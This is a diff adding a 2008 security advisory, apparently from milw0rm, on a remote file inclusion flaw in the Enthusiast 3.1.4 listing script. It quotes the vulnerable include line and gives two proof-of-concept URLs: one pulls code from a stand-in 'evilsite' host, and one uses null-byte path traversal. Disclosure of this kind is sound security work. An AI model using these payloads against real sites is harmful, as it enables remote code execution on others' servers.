@@ -1,0 +1,57 @@
+########################## www.BugReport.ir #########################
+#
+#      AmnPardaz Security Research Team
+#
+# Title: Enthusiast 3 Remote Code Execution
+# Vendor: http://scripts.indisguise.org/enthusiast/
+# Bug: File Inclusion
+# Vulnerable Version: 3.1.4 (prior versions also may be affected)
+# Exploitation: Remote with browser
+# Fix: N/A
+# Original Advisory: http://www.bugreport.ir/index_57.htm
+###################################################################
+
+
+####################
+- Description:
+####################
+
+Enthusiast is a full-featured member listing collective management script. It is geared towards fanlisting owners who own multiple fanlistings, but easily
+
+customizable for other types of listings as well?cliques, physical listings, taboo listings, and the like.
+
+
+####################
+- Vulnerability:
+####################
+
++--> File Inclusion
+
+When register_globals is enabled, Its possible to include arbitrary files from local or remote resources.
+
+####################
+- Code Snippet:
+####################
+/show_joined.php #line:261-264
+
+<p class="show_joined_credits">
+<a href="http://scripts.indisguise.org">Powered by Enthusiast
+<?php include $path . 'show_enthversion.php' ?></a>
+</p>
+
+####################
+- Exploits/POCs:
+####################
+
+POC: http://example.com/enth_3.1.4/enth3/show_joined.php?path=http://evilsite/ (this one includes show_enthversion.php from evilsite)
+POC: http://example.com/enth_3.1.4/enth3/show_joined.php?path=../../evilscript.php%00 (this requiers magic_quotes_gpc to be disabled)
+
+####################
+- Credit :
+####################
+AmnPardaz Security Research Team
+Contact: admin[4t}bugreport{d0t]ir
+www.BugReport.ir
+www.AmnPardaz.comz
+
+# milw0rm.com [2008-11-08]
